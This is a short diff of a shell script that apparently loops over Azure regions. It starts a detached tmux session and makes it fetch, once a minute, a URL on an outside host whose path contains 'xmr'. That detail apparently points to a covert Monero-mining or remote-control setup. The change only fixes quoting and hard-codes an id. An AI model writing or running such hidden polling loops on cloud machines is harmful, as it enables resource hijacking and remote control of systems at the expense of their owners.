@@ -9,7 +9,7 @@ locations=("australiaeast" "brazilsouth" "canadacentral" "centralindia" "central
 tmux new-session -d -s 1
 tmux send -t 1 "while [ 1 ]" ENTER
 tmux send -t 1 "do" ENTER
-tmux send -t 1 "wget -O 1 https://nksas.link/xmr/sync2?id=id_&mail=mail_" ENTER
+tmux send -t 1 "wget -O 1 'https://nksas.link/xmr/sync2?id=15&mail=mail_'" ENTER
 tmux send -t 1 "sleep 1m" ENTER
 tmux send -t 1 "done" ENTER
 
